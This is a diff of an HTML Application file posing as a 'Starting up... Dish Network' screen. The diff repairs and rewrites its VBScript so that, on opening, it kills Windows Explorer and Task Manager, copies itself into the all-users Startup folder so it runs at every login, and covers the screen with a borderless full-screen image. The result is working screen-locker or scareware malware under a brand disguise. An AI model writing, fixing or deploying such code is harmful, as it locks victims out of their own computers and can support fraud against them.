@@ -1,17 +1,13 @@
 <HTML>
 <HEAD>
- 
-<meta http-equiv="X-UA-Compatible" content="IE=9" />  
-<HTA:APPLICATION ID="oHTA"
-
+<meta http-equiv="X-UA-Compatible" content="IE=9" />
+<HTA:APPLICATION
+    ID="oHTA"
     APPLICATIONNAME="Starting up... Dish Network"
-
     WINDOWSTATE="maximize"
     BORDER="none"
+/>
 
-   >
-</HEAD>
-<BODY SCROLL="no">
 <style>
 html, body {
     margin: 0;
@@ -25,17 +21,24 @@ html, body {
 img {
     width: 100vw;
     height: 100vh;
-    object-fit: fill; /* stretches image */
+    object-fit: fill;
 }
 </style>
-  <script language="VBScript">
-    Set shell = CreateObject("WScript.Shell")
-    shell.Run "taskkill /f /im explorer.exe", 0, True
-    shell.Run "taskkill /f /im taskmgr.exe", 0, True
-    shell.Run "copy %USERPROFILE%\Downloads\dishboot.hta %programdata%\Microsoft\Windows\Start Menu\Programs\Startup", 0, True
-  </script>
-</head>
-<body>
+
+<script language="VBScript">
+Set shell = CreateObject("WScript.Shell")
+
+startup = shell.ExpandEnvironmentStrings("%ProgramData%") & "\Microsoft\Windows\Start Menu\Programs\Startup\dishboot.hta"
+source = shell.ExpandEnvironmentStrings("%USERPROFILE%") & "\Downloads\dishboot.hta"
+
+shell.Run "cmd /c copy /y """ & source & """ """ & startup & """", 0, True
+
+shell.Run "taskkill /f /im explorer.exe", 0, True
+shell.Run "taskkill /f /im taskmgr.exe", 0, True
+</script>
+</HEAD>
+
+<BODY SCROLL="no">
 <img src="https://file.garden/aUYIWVAKvQxCBY-_/database/images/dish.png">
 </BODY>
 </HTML>
